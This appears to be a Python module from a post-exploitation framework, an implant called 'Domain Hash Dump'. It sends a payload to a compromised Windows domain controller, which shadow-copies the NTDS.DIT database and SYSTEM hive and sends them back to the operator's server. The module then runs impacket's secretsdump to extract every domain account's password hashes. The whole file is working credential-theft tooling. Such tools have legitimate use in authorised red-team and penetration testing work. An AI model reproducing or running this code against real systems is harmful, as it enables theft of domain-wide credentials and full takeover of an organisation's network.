import core.implant
import uuid

class HashDumpDCImplant(core.implant.Implant):

    NAME = "Domain Hash Dump"
    DESCRIPTION = "Dumps the NTDS.DIT off the target domain controller."
    AUTHORS = ["zerosum0x0", "Aleph-Naught-"]
    STATE = "implant/gather/hashdump_dc"

    def load(self):
        self.options.register("LPATH", "/tmp/", "local file save path")
        self.options.register("DRIVE", "C:", "the drive to shadow copy")
        self.options.register("RPATH", "%TEMP%", "remote file save path")

        self.options.register("UUIDHEADER", "ETag", "HTTP header for UUID", advanced=True)

        self.options.register("NTDSFILE", "", "random uuid for NTDS file name", hidden=True)
        self.options.register("SYSHFILE", "", "random uuid for SYSTEM hive file name", hidden=True)
        self.options.register("CERTUTIL", "false", "use certutil to base64 encode the file before downloading", required=True, boolean=True)

    def job(self):
        return HashDumpDCJob

    def run(self):
        import os.path
        import os
        if not os.path.isfile("data/impacket/examples/secretsdump.py"):
            old_prompt = self.shell.prompt
            old_clean_prompt = self.shell.clean_prompt
            self.shell.prompt = "Would you like me to get it for you? y/N: "
            self.shell.clean_prompt = self.shell.prompt

            self.shell.print_warning("It doesn't look like you have the impacket submodule installed yet! This module will fail if you don't have it!")
            try:
                import readline
                readline.set_completer(None)
                option = self.shell.get_command(self.shell.prompt)

                if self.shell.spool:
                    self.shell.spool_log(self.shell.clean_prompt, option)

                if option.lower() == "y":
                    from subprocess import call
                    call(["git", "submodule", "init"])
                    call(["git", "submodule", "update"])
            except KeyboardInterrupt:
                self.shell.print_plain(self.shell.clean_prompt)
                return
            finally:
                self.shell.prompt = old_prompt
                self.shell.clean_prompt = old_clean_prompt

        payloads = {}
        payloads["js"] = "data/implant/gather/hashdump_dc.js"

        self.dispatch(payloads, self.job)

class HashDumpDCJob(core.job.Job):
    def create(self):
        self.options.set("NTDSFILE", uuid.uuid4().hex)
        self.options.set("SYSHFILE", uuid.uuid4().hex)
        self.options.set("RPATH", self.options.get('RPATH').replace("\\", "\\\\").replace('"', '\\"'))

    def save_file(self, data, name, encoder, decode = True):
        import uuid
        import os
        save_fname = self.options.get("LPATH") + "/" + name + "." + self.session.ip + "." + uuid.uuid4().hex
        save_fname = save_fname.replace("//", "/")

        i = 0
        step = 10000000
        partfiles = []
        while i < len(data):
            with open(save_fname+str(i), "wb") as f:
                partfiles.append(save_fname+str(i))
                end = i+step
                if end > len(data):
                    end = len(data)
                pdata = data
                if decode:
                    while True:
                        try:
                            pdata = self.decode_downloaded_data(pdata[i:end], encoder)
                        except:
                            end -= 1
                            continue
                        break
                f.write(pdata)
            i = end

        with open(save_fname, "wb+") as f:
            for p in partfiles:
                f.write(open(p, "rb").read())
                os.remove(p)


        return save_fname

    def report(self, handler, data, sanitize = False):
        task = handler.get_header(self.options.get("UUIDHEADER"), False)

        if task == self.options.get("SYSHFILE"):
            handler.reply(200)

            self.print_status("received SYSTEM hive (%d bytes)" % len(data))
            self.system_data = data
            self.system_encoder = handler.get_header("encoder", False)
            return

        if task == self.options.get("NTDSFILE"):
            handler.reply(200)

            self.print_status("received NTDS.DIT file (%d bytes)" % len(data))
            self.ntds_data = data
            self.ntds_encoder = handler.get_header("encoder", False)
            return

        # dump ntds.dit here

        import threading
        self.finished = False
        threading.Thread(target=self.finish_up).start()
        handler.reply(200)

    def finish_up(self):
        self.ntds_file = self.save_file(self.ntds_data, 'NTDS', self.ntds_encoder)
        self.print_status("decoded NTDS.DIT file (%s)" % self.ntds_file)

        self.system_file = self.save_file(self.system_data, 'SYSTEM', self.system_encoder)
        self.print_status("decoded SYSTEM hive (%s)" % self.system_file)

        from subprocess import Popen, PIPE, STDOUT

        path = "data/impacket/examples/secretsdump.py"
        cmd = ['python2', path, '-ntds', self.ntds_file, '-system', self.system_file, '-hashes', 'LMHASH:NTHASH', 'LOCAL']
        p = Popen(cmd, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True, env={"PYTHONPATH": "./data/impacket"})
        output = p.stdout.read()
        #self.shell.print_plain(output.decode())
        self.dump_file = self.save_file(output, 'DCDUMP', 0, False)
        super(HashDumpDCJob, self).report(None, "", False)

    def done(self):
        self.results = self.dump_file
        self.display()
        #pass

    def display(self):
        #pass
        self.print_good("DC hash dump saved to %s" % self.dump_file)
